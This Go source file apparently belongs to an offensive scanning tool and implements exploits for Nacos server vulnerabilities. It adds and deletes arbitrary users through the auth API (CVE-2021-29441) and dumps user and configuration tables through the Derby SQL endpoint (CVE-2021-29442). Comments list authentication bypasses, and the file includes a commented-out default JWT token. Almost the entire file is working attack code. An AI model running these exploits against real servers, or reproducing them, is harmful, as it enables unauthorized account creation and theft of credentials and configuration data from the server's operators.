package nacos

import (
	"fmt"
	"net/http"
	"slack-wails/lib/clients"
	"strings"
)

// const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
const cve_2021_29411_userURI = "/v1/auth/users"
const cve_2021_29442_URI = "/v1/cs/ops/derby?sql="

var sqi = []string{"select * from users", "select * from config_tags_relation", "select * from app_configdata_relation_pubs", "select * from app_configdata_relation_subs", "select * from app_list", "select * from config_info_aggr", "select * from config_info_tag", "select * from config_info_beta", "select * from his_config_info", "select * from config_info"}

// url 必须输入Nacos页面路径 例如 http://xxx/nacos
// 任意用户添加
// UA绕过 ser-Agent: Nacos-Server
// JWT默认key绕过
// serverIdentity头绕过 Nacos <= 2.2.0
func CVE_2021_29441_Step1(url string, headers map[string]string, username, password string, client *http.Client) bool {
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	content := fmt.Sprintf("username=%s&password=%s", username, password)
	_, body, err := clients.NewRequest("POST", url+cve_2021_29411_userURI, headers, strings.NewReader(content), 10, false, client)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "create user ok")
}

// 删除用户
func CVE_2021_29441_Step2(url string, headers map[string]string, username string, client *http.Client) bool {
	_, body, err := clients.NewRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, headers, nil, 10, false, client)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "delete user ok")
}

// CVE-2021-29442 Derby SQL注入
func CVE_2021_29442(url string, headers map[string]string, client *http.Client) string {
	var result string
	for _, sql := range sqi {
		_, body, err := clients.NewRequest("GET", url+cve_2021_29442_URI+sql, headers, nil, 10, false, client)
		if err != nil {
			return "请求失败已停止，返回之前SQL语句请求结果\n\n" + result
		}
		if strings.Contains(string(body), "\"code\":200") {
			result += string(body) + "\n"
		}
	}
	return result
}
